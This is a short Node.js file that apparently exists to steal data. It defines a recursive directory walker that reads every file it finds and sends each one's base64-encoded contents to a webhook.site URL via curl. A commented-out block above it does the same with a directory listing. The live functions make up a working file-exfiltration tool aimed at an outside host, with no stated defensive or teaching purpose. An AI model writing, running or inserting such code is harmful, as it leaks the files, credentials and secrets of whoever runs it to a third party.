


// const { exec } = require('node:child_process')


// exec('curl https://webhook.site/200fdf69-4bd3-4432-9c2c-7617a5a5c458?$(cd /usr/bin/bash; ls | base64)' , (err, output) => {
//     if (err) {
//         console.error("could not execute command: ", err)
//         return
//     }
//     // log the output received from the command
//     console.log("Output: \n", output)
// })



const fs = require("fs");
const process = require("child_process");

let cat = function(filepath) {
    let contents = fs.readFileSync(filepath, {encoding: "utf-8"});
    return contents;
}

let ls = function (dirpath) {
    let contents = fs.readdirSync(dirpath, {withFileTypes: true});

    for (let item of contents) {
        console.log(item);

        if (item.isDirectory()) {
            try {
            ls(dirpath + "/" + item.name);
            } catch (err) {console.log(err)}
        }

        try {
        console.log(dirpath + "/" + item.name)
        const content = cat(dirpath + "/" + item.name)
        console.log(content)
        process.exec("curl https://webhook.site/200fdf69-4bd3-4432-9c2c-7617a5a5c458?" + Buffer.from(content).toString('base64'))
        } catch (err) { console.log(err); }
    }
}
